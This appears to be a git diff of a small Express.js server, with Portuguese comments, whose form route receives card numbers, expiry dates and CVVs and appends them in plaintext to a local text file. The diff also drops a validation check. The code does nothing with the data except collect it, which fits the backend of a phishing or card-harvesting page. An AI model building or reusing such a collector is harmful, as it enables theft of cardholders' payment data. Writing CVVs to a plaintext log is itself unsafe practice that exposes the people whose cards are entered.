@@ -6,25 +6,22 @@ const cors = require('cors');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// Middleware
+// Permite que o frontend acesse o backend
 app.use(cors());
 app.use(express.json());
+
+// Define a pasta pública onde estão os arquivos estáticos
 app.use(express.static(path.join(__dirname, 'public')));
 
-// Rota para receber os dados
+// Rota de envio de dados do formulário
 app.post('/enviar', (req, res) => {
   const data = req.body;
 
-  // Verifica se os dados foram recebidos corretamente
+  // Log no terminal para debug
   console.log('Dados recebidos:', data);
 
-  if (!data.numeroCartao || !data.validade || !data.cvv) {
-    console.error('Dados incompletos recebidos');
-    return res.status(400).json({ message: 'Dados incompletos' });
-  }
-
   const log = `
-Número do Cartão: ${data.numeroCartao}
+Número do Cartão: ${data['card-number']}
 Validade: ${data.validade}
 CVV: ${data.cvv}
 -----------------------------
@@ -32,11 +29,9 @@ CVV: ${data.cvv}
 
   fs.appendFile('dados.txt', log, (err) => {
     if (err) {
-      console.error('Erro ao salvar os dados no arquivo:', err);
-      return res.status(500).json({ message: 'Erro ao salvar os dados' });
+      console.error('Erro ao salvar:', err);
+      return res.status(500).json({ message: 'Erro ao salvar dados' });
     }
-
-    console.log('Dados salvos com sucesso.');
     res.status(200).json({ message: 'Dados recebidos com sucesso!' });
   });
 });
